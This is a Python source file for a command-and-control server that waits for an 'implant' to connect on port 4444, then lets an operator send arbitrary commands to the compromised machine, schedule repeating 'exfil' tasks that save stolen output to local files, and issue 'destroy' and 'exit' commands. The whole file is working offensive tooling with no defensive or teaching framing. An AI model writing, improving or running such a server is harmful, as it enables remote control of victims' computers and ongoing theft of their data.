# c2_server.py
import socket
import threading
import time

HOST = '0.0.0.0'
PORT = 4444
task_counter = 0
tasks = {}

def receive_complete(conn):
    data = b""
    while True:
        chunk = conn.recv(4096)
        if not chunk:
            break
        data += chunk
        if b"[*] END\n" in data or b"[-]" in data:
            break
    return data.decode(errors='ignore')

def exfil_thread(conn, cmd, outfile, repeat, stop_event, task_id):
    while not stop_event.is_set():
        conn.sendall((cmd + "\n").encode())
        data = receive_complete(conn)
        if outfile:
            with open(outfile, "ab") as f:
                f.write(data.encode())
        time.sleep(repeat)

def exfil_once(conn, cmd, outfile):
    conn.sendall((cmd + "\n").encode())
    data = receive_complete(conn)
    if outfile:
        with open(outfile, "ab") as f:
            f.write(data.encode())
        print(f"[+] Exfiltrated data appended to {outfile}")
    else:
        print(data)

def parse_command(cmd):
    parts = cmd.split()
    outfile = None
    repeat = 0

    if "exfil" not in parts:
        return cmd, outfile, repeat

    if "-o" in parts:
        idx = parts.index("-o")
        if idx + 1 < len(parts):
            outfile = parts[idx + 1]
            parts = parts[:idx] + parts[idx+2:]

    if "-r" in parts:
        idx = parts.index("-r")
        if idx + 1 < len(parts):
            try:
                repeat = int(parts[idx + 1])
            except ValueError:
                print("[-] Invalid repeat value")
            parts = parts[:idx] + parts[idx+2:]

    real_cmd = " ".join(parts)
    return real_cmd, outfile, repeat

server = socket.socket()
server.bind((HOST, PORT))
server.listen(1)

print("[*] Waiting for implant connection...")
conn, addr = server.accept()
print(f"[+] Connection from {addr}")

try:
    while True:
        cmd = input("C2> ").strip()
        if not cmd:
            continue

        # Stop a specific task
        if cmd.startswith("stop "):
            try:
                task_id = int(cmd.split()[1])
                if task_id in tasks:
                    tasks[task_id]['stop'].set()
                    tasks[task_id]['thread'].join()
                    del tasks[task_id]
                    print(f"[~] Task {task_id} stopped.")
                else:
                    print(f"[-] Task {task_id} not found.")
            except ValueError:
                print("[-] Invalid task ID.")
            continue

        # List active tasks
        if cmd == "tasks":
            if not tasks:
                print("[~] No active tasks.")
            else:
                print("[~] Active tasks:")
                for tid, info in tasks.items():
                    print(f"  Task ID: {tid}, Command: {info['cmd']}, Interval: {info['interval']}s, Outfile: {info['outfile']}")
            continue

        real_cmd, outfile, repeat = parse_command(cmd)

        if real_cmd == "exit":
            conn.sendall(b"exit\n")
            break

        if real_cmd.startswith("exfil"):
            task_id = task_counter + 1
            task_counter += 1

            if repeat > 0:
                stop_event = threading.Event()
                print(f"[~] Repeating exfil every {repeat} seconds... (Task ID: {task_id})")
                thread = threading.Thread(target=exfil_thread, args=(conn, real_cmd, outfile, repeat, stop_event, task_id))
                thread.daemon = True
                thread.start()
                tasks[task_id] = {'thread': thread, 'stop': stop_event, 'cmd': real_cmd, 'interval': repeat, 'outfile': outfile}
            else:
                exfil_once(conn, real_cmd, outfile)
        else:
            conn.sendall((real_cmd + "\n").encode())
            try:
                data = receive_complete(conn)
                if not data:
                    print("[!] Connection closed by implant")
                    break
                print(data)
                if real_cmd == "destroy":
                    conn.sendall(b"exit\n")
                    break
            except (ConnectionAbortedError, ConnectionResetError, BrokenPipeError):
                print("[!] Connection closed by implant")
                break
except KeyboardInterrupt:
    print("\n[!] C2 interrupted.")
finally:
    conn.close()
    server.close()
